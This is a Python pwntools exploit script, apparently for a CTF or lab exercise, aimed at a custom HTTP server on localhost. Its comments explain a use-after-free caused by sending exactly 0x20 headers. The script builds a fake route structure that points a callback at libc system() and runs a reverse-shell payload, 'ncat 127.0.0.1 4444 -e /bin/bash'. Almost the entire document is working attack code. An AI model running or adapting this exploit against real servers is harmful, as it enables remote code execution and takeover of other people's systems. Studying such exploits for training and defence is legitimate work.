#!/usr/bin/env python3
from pwn import * 

p = remote("127.0.0.1", 8081) 
p.newline = b"\r\n" # Newlines for the 'sendline'

'''
If we got to EXACTLY the length of the amount of headers for a 
response, it creates problems. 

Some of the usage of 'res_headers_lst' only check for NULL and 
NOT the maximum amount. As a result, we can use the pointer AFTER
this to do things. 
In practice, this is the 'routes' array! 

The usage includes an unnecessary free, which creates a UAF on the routes. 
The routes structure has function pointers on it. If we can create a fake
route, we can easily get code execution. 
'''
p.sendline(b"GET /files/hello_world.html" + b" HTTP/1.1")

#string += "Content-Length: %s\r\n" % (len(payload))
p.sendline(b"Connection:AAA") # Make a NEW connection after this 

# Have 0x20 response headers. 0x1F + 1 = 0x20 with the content-type header getting added
for _ in range(0x1F):
    p.sendline(b"X-Request-Id: BBB")  # Need EXACTLY 0x20 headers to exploit this
p.sendline(b"")


#####
# Second Request
###
p.recvline() 

payload = b""

# The ROUTE is defined by US
p.sendline("ncat%20127.0.0.1%204444%20-e%20/bin/bash /" + " HTTP/1.1") 

'''
The 'routes' array is a list of pointers to routes. 
To fake this properly, we need to create a FAKE route. 
The KEY is going to be our list of pointers entries in the 
first of the headers.
- 0x110 sized chunk - same as the 'routes' allocation

Our VALUE is going to be our FAKE pointer for the entry.
- Verb (string) 
- Route (Pointer of to string) 
- Default Callback (function pointer) 

<<Fake 'Routes'>>:<<malicious route>>

When the 'default_callback' on the route is made, 
the 'RDI' register contains the ROUTE that is being checked. 
So, we can make the route our payload. 
'''

# Can be found with leak or hardcoded with ASLR disabled
heap_base = 0x55555557b000
libc_base = 0x7ffff7e15000

## Offsets to important things!
system_offset = 0x459e7
payload_offset = 0xa70  # 'ncat...' 
fake_route_offset = 0x2690

# Key in the header - 0x110 sized chunk
# Will become the ROUTES allocation
fake_routes = p64(heap_base + fake_route_offset) * 0x20 # Create a large LIST of pointers to our fake chunk.

# Will become the POINTER of the routes. Fake route :) 
fake_route =  b"ncat 127.0.0.1 4444 -e /bin/bash\x00" # Verb - system payload
fake_route += (0x40 - len(fake_route)) * b"B" # Filler for the REST of the verb - filler
fake_route += p64(heap_base + fake_route_offset + 0x40 + 0x10) # path string pointer - set to ALL, since this is a POINTER
fake_route += p64(libc_base + system_offset) # Default callback - function pointer (system)
fake_route += b"/\x00" # path] string pointer data
fake_route += (0x100 - len(fake_route)) * b"C"

# Sending the ACTUAL fake route
crafted_chunks = fake_routes + b":" + fake_route 
p.sendline(crafted_chunks) 

p.sendline(b"DDDDDDDDDDDDDDDDDDDDDDDD:EEEEEEEEEEEE") 
p.sendline("")
p.sendline("")

p.interactive()